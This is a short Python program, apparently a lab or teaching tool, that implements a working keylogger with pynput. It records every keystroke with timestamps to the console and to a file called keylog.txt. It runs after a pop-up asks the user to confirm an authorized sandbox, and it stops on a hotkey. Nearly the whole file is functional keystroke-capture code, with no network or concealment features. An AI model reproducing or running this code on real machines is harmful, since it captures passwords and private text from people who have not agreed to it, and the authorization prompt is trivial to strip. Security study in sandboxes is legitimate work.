import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
from datetime import datetime
import threading

LOG_FILE = "keylog.txt"
listener = None

def write_log(line):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")
    except Exception as e:
        print(f"[ERROR] Could not write to log file: {e}")

def on_press(key):
    try:
        # Format printable characters
        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            key_str = f"[{key.name.upper()}]"

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"{timestamp} - {key_str}")
        write_log(f"{timestamp} - {key_str}")

    except Exception as e:
        print(f"[ERROR] Exception in on_press: {e}")

def start_keylogger():
    global listener
    write_log("\n[SESSION START]")
    print("[INFO] Keylogger started. Press Ctrl + Shift + Q to stop.")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def stop_keylogger():
    global listener
    write_log("[SESSION END]")
    print("[INFO] Hotkey pressed. Stopping keylogger.")
    if listener:
        listener.stop()

def monitor_hotkey():
    with keyboard.GlobalHotKeys({
        '<ctrl>+<shift>+q': stop_keylogger
    }) as h:
        h.join()

def show_authorization_message():
    # Warning pop-up to notify users
    root = tk.Tk()
    root.withdraw()

    message = (
        "This keylogger is designed to only be used for authorized lab virtual machines "
        "and sandbox environments. Do you confirm that this is an authorized environment?"
    )

    result = messagebox.askyesno("Environment Authorization", message)

    if not result: messagebox.showinfo("Exit", "You did not confirm. The program will now exit.");
    root.destroy()
    return result

if __name__ == "__main__":
    # Start keylogger and hotkey monitor in separate threads
    if show_authorization_message():
        threading.Thread(target=start_keylogger, daemon=True).start()
        monitor_hotkey()

